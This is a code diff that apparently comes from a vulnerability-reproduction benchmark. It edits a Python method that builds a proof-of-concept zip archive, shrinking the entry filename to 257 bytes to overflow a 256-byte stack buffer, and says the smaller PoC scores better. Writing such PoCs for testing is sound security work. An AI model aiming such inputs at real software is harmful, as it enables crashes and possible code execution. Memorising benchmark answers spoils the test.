@@ -12,20 +12,22 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        # The vulnerability is caused by copying a zip entry's filename into a
-        # 256-byte stack buffer without size validation.
-        # We create a filename longer than 256 bytes to trigger the overflow.
-        # A length of 300 is chosen to be safely over the limit.
-        long_filename = 'A' * 300
-
-        # Create an in-memory zip file to avoid disk I/O.
-        mem_zip = io.BytesIO()
-
-        # Use the zipfile module to construct the archive.
-        # ZIP_STORED is used for a smaller PoC since the file content is empty.
-        with zipfile.ZipFile(mem_zip, 'w', compression=zipfile.ZIP_STORED) as zf:
-            # Add a file with the oversized filename. The content is irrelevant.
+        # The vulnerability is a stack buffer overflow caused by a filename
+        # longer than the 256-byte buffer allocated for it.
+        # To trigger this, we create a zip archive with a file whose name
+        # is just over the buffer size. A 257-byte filename is sufficient.
+        # This minimizes the PoC size for a better score.
+        
+        long_filename = 'A' * 257
+        
+        # Create the zip file in-memory.
+        zip_buffer = io.BytesIO()
+        
+        # We use ZIP_STORED as there is no data to compress, which is efficient
+        # and creates a predictable and minimal file size.
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
+            # The content of the file does not matter for the vulnerability.
+            # Empty content results in the smallest possible PoC.
             zf.writestr(long_filename, b'')
-
-        # Return the generated zip file as a bytes object.
-        return mem_zip.getvalue()
+            
+        return zip_buffer.getvalue()
